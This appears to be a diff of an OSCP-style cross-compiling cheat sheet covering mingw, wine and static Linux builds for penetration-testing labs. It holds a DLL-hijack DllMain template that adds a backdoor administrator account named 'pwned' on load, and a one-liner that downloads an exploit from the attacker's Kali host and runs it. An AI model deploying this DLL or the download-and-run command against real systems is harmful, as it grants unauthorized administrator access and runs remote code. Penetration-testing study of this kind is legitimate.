@@ -9,7 +9,7 @@ summary: "What to do for Windows and Linux when the target cannot compile, or wh
 What to do when the target cannot compile, when you should test on Kali first, and when GLIBC gets in the way. Covers both Windows (mingw + wine) and Linux (docker + static).
 
 - Source: https://heretek.dev/oscp-cheatsheet/cross-compiling/ (Jean Romero) — Reconstructed
-- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
+- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP (`KALI_IP` / `ATTACKER` in the body mean the same Kali IP)
 
 ## 1. When to use this document
 
@@ -66,22 +66,23 @@ Flags per symbol:
 Use the same compiler with `--shared` and the `.dll` extension. The filename must exactly match the DLL the target app loads (required).
 
 ```bash
-x86_64-w64-mingw32-gcc evil.cpp --shared -o TextShaping.dll
+x86_64-w64-mingw32-g++ evil.cpp --shared -o TextShaping.dll
 ```
 
 DllMain template — the payload runs on `DLL_PROCESS_ATTACH`:
 
-```text
+```c
 #include <stdlib.h>
 #include <windows.h>
 
 BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
-        case DLL_PROCESS_ATTACH:
+        case DLL_PROCESS_ATTACH: {
             int i;
             i = system("net user pwned Password123! /add");
             i = system("net localgroup administrators pwned /add");
             break;
+        }
         case DLL_THREAD_ATTACH:  break;
         case DLL_THREAD_DETACH:  break;
         case DLL_PROCESS_DETACH: break;
@@ -139,7 +140,7 @@ file exploit          # confirm: ELF 64-bit, x86_64
 python3 -m http.server 8000
 
 # On target:
-wget http://KALI_IP:8000/exploit && chmod +x exploit && ./exploit
+wget http://$KALI:8000/exploit && chmod +x exploit && ./exploit
 ```
 
 Target distro → container:
